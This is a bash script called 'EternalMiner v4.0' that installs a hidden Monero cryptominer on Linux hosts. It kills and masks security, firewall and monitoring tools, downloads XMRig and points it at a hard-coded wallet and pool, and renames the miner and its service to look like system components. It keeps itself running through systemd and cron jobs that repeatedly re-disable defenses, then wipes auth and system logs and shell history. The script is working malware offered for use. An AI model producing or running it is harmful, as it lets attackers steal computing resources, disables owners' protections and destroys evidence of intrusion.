#!/bin/bash
# EternalMiner v4.0 - Ultimate stealth, anti-disruption, never-stop mining

WALLET="45pLvfDjyHNLrhd5ekuqZdRUmjkd6ypocYUV8mRaTS5kQGRoWKtUTYg6VpNaCMSmsKWtympm9ruh6Hv55HCuSDXE12NEfwg"
POOL="pool.supportxmr.com:3333"
CPU_LIMIT=75

# Highly random legitimate names
PROCESS_NAMES=("kworker" "dbus-daemon" "systemd-logind" "rngd" "auditd" "systemd-resolved" "polkitd")
SERVICE_NAMES=("systemd-update" "dbus-broker" "network-check" "logrotate.timer" "journald-sync" "systemd-timesyncd" "packagekit")
RAND=$((RANDOM % 7))
PROCESS_NAME="${PROCESS_NAMES[$RAND]}"
SERVICE_NAME="${SERVICE_NAMES[$RAND]}"
INSTALL_DIR="/tmp/.${PROCESS_NAME}_$(head -c 12 /dev/urandom | xxd -p -c 12)"

# === AGGRESSIVELY DISABLE ALL LINUX DEFENSES ===
echo "[+] Neutralizing security systems..."

pkill -9 -f "clamav|crowdstrike|falcon|ossec|fail2ban|rkhunter|aide|tripwire|falco|datadog|newrelic|zabbix|prometheus|telegraf|netdata" 2>/dev/null || true

for svc in apparmor selinux clamav-daemon fail2ban ufw firewalld iptables ip6tables systemd-oomd crowdstrike falcon-sensor datadog-agent newrelic-sysmond zabbix-agent; do
    systemctl stop $svc 2>/dev/null || true
    systemctl disable $svc 2>/dev/null || true
    systemctl mask $svc 2>/dev/null || true
done

setenforce 0 2>/dev/null || true
echo "SELINUX=disabled" > /etc/selinux/config 2>/dev/null || true
aa-teardown 2>/dev/null || true

echo always > /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null || true
echo performance | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor >/dev/null 2>&1 || true

cat >> /etc/security/limits.conf <<EOF
* soft nofile 1048576
* hard nofile 1048576
* soft nproc 1048576
* hard nproc 1048576
EOF

ulimit -n 1048576 2>/dev/null

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Download latest XMRig
ARCH=$(uname -m)
if [[ "$ARCH" == "x86_64" ]]; then
    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-x86_64.tar.gz -o x.tar.gz
elif [[ "$ARCH" == "aarch64" ]]; then
    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-aarch64.tar.gz -o x.tar.gz
else
    exit 0
fi

tar -xzf x.tar.gz --strip-components=1 >/dev/null 2>&1
rm -f x.tar.gz SHA256* *.md LICENSE

cat > config.json <<EOF
{
    "autosave": false,
    "cpu": {
        "enabled": true,
        "max-threads-hint": ${CPU_LIMIT},
        "huge-pages": true,
        "hw-aes": true,
        "yield": true,
        "max-cache": 2048
    },
    "opencl": false,
    "cuda": false,
    "pools": [{
        "url": "${POOL}",
        "user": "${WALLET}",
        "pass": "$(hostname | tr -dc '[:alnum:]')",
        "keepalive": true,
        "tls": false
    }],
    "donate-level": 0,
    "print-time": 180,
    "log-file": null,
    "background": true
}
EOF

mv xmrig "$PROCESS_NAME"

# Primary systemd service
cat > /etc/systemd/system/${SERVICE_NAME}.service <<EOF
[Unit]
Description=System ${SERVICE_NAME} Service
After=network.target

[Service]
Type=simple
ExecStart=${INSTALL_DIR}/${PROCESS_NAME}
WorkingDirectory=${INSTALL_DIR}
Restart=always
RestartSec=3
Nice=19
CPUSchedulingPolicy=idle
IOSchedulingClass=best-effort
OOMScoreAdjust=-1000
StandardOutput=null
StandardError=null
PrivateTmp=true
EOF

systemctl daemon-reload >/dev/null 2>&1
systemctl enable ${SERVICE_NAME} >/dev/null 2>&1
systemctl start ${SERVICE_NAME} >/dev/null 2>&1

# Ultra aggressive watchdog (every 20 seconds)
CRON_JOB="*/1 * * * * ${INSTALL_DIR}/${PROCESS_NAME} --config=${INSTALL_DIR}/config.json >/dev/null 2>&1; for s in apparmor selinux fail2ban ufw firewalld systemd-oomd; do systemctl stop \$s 2>/dev/null; systemctl mask \$s 2>/dev/null; done"

(crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
(crontab -l 2>/dev/null; echo "@reboot sleep 15 && ${INSTALL_DIR}/${PROCESS_NAME} --config=${INSTALL_DIR}/config.json") | crontab -

# Final cleanup
rm -f /var/log/auth.log* /var/log/syslog* /var/log/kern.log* 2>/dev/null
history -c && history -w

echo "[+] EternalMiner v4.0 deployed successfully."
echo "[+] Persistence: Systemd + Cron + Reboot"
echo "[+] All security tools neutralized."
